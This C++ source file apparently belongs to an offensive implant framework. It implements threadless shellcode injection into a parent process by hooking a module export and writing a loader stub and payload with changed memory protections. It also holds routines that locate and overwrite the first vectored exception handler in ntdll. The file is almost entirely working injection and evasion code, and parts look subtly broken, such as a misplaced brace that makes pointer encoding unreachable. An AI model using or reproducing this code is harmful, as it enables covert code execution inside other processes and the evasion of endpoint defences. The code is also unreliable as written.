#include <core/include/inject.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

namespace Injection {

    VOID Threadless(_threadless threadless, void *shellcode, size_t n_shellcode, size_t total) {
        HEXANE

        // todo: needs MmPivotRegion (Flower) :
        // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]

        HANDLE process      = { };
        UINT_PTR ex_addr    = 0;
        UINT_PTR ex_addr_p  = 0;
        UINT_PTR hook       = 0;
        SIZE_T write        = 0;

        if (!(ex_addr = Memory::Modules::LoadExportAddress(threadless.Module.Buffer, threadless.Export.Buffer)) ||
            !(process = Process::OpenParentProcess(threadless.Parent.Buffer)) ||
            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), n_shellcode))) {
            return;
        }

        auto loader_rva = hook - (ex_addr + 5);
        auto hook_p = hook;

        Memory::PatchMemory(B_PTR(&ex_addr_p), B_PTR(&ex_addr), 0, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(threadless.Loader.Buffer), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, threadless.Opcode.Buffer), threadless.Opcode.Length, &write)) || write != threadless.Opcode.Length) {
            return_defer(ntstatus);
        }
        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &total, PAGE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), threadless.Loader.Buffer, threadless.Loader.Length, &write)) || write != threadless.Loader.Length) {
            return_defer(ntstatus);
        }

        //Xtea::XteaCrypt(R_CAST(PBYTE, shellcode), n_shellcode, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
            return_defer(ntstatus);
        }

        defer:
        if (process) {
            Ctx->Nt.NtClose(process);
        }
    }

    namespace Veh {

        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *signature, const char *mask) {
            HEXANE

            LdrpVectorHandlerList *handlers = { };
            uintptr_t handler = { };
            uint32_t match = 0;

            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, module->DllBase), module->SizeOfImage, signature, mask))) {
                return_defer(ERROR_INCORRECT_ADDRESS);
            }

            match += 0xD;
            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7));

            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {
                handler = 0;
                return_defer(ntstatus);
            }

            defer:
            return handler;
        }

        UINT_PTR GetStackCookie() {
            HEXANE
            uintptr_t cookie = 0;

            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                cookie = 0;
            }

            return cookie;
        }

        UINT_PTR EncodePointer(uintptr_t handler, const bool encode) {
            HEXANE

            uintptr_t pointer = 0;
            uintptr_t cookie = 0;

            if (!(cookie = GetStackCookie())) {
                return_defer(ntstatus);

            encode
                ? pointer = _rotr(cookie ^ handler, cookie & 0x1F)
                : pointer = cookie ^ _rotr(pointer, 0x20 - (cookie & 0x1F));

            defer:
            return pointer;
        }

        LONG OverwriteFirstHandler(const uintptr_t address, const wchar_t *mod_name) {
            HEXANE

            const auto mod_hash = Utils::GetHashFromStringW(mod_name, x_wcslen(mod_name));
            const auto ntdll = Memory::Modules::GetModuleEntry(mod_hash);

            const auto entry = Veh::GetFirstHandler(ntdll, "\x00\x00\x00\x00\x00\x00\x00\x00", "xxx00xxx");
            const auto handler = Veh::EncodePointer(entry, false) + 0x20;

            if (!entry) {
                return FALSE;
            }

            return Ctx->Nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), C_PTR(address), sizeof(uintptr_t), nullptr);
        }
    }
}
